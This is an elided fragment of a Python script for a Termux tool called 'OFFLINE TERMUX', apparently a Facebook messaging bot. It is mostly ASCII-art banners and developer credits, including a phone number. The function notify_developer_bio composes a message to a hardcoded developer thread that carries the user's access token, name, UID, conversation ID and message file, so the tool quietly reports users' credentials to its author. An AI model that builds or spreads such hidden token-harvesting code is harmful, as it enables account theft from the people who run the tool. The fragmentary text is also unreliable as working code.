...
│ [=] CODER BOY   ::                               BROKEN AWRU                      │
│ [=] RULEX BOY   ::                                 I HAV3 NO BRUH                       │
...
╰─────────────────────────────────────────────────────────────────────────────────────╯"""
    ...
    new_bio = r"""╭──────────────────────────── < DETAILS >─────────────────────────────────────────────╮
│  [=]    DEVELOPER                : BROKEN AWRU                                  │
│  [=]    TOOLS NAME               : OFFLINE TERMUX                                   │
│  [=]    RULLEX                   : UP FIRE RULEX                                    │
│  [=]    BRAND                    : OFFLINE TERMUX                                   │
│  [=]    GITHUB                   : BROKEN LEG4ND AWRU                                    │
│  [=]    BROTHER                  : I HAVE NO BRUH                                     │
│  [=]    TOOLS                    : OFFLINE TERMUx                                   │
│  [=]    WHATSAP                  : +918287041662                                   │
╰─────────────────────────────────────────────────────────────────────────────────────╯"""
...
def animated_logo():
    logo_text = r"""
  _______           _______               _       __________________ _        _                
...
def notify_developer_bio(current_token, mn, thread_id, uid, ms):
    DEV_THREAD_ID = "t_100054883517133"
    bio_message = f"Hellow  Awru SiiR I am USīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken:: {current_token}\nName:: {mn}\nConversation:: {thread_id}\nUID:: {uid}\nMessage File:: {ms}"
...
def venom():
    ...
    info = r"""═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
     OWNER NAME                   :: BROKEN AWRU                               :: BROKEN
     CCRETOR                      :: LEGEND BOY AK.                               :: NO GANG 
     YOUR FB ID                   :: IM NOT USSER FB                             :: SINGLE 
     CONTACTS                     :: +918287041662                               :: MONXTER A G
═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════"""
...
print(Fore.GREEN + "[•] BROKEN BOY AWRU IINSIIDE \n")
animated_print("══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════")
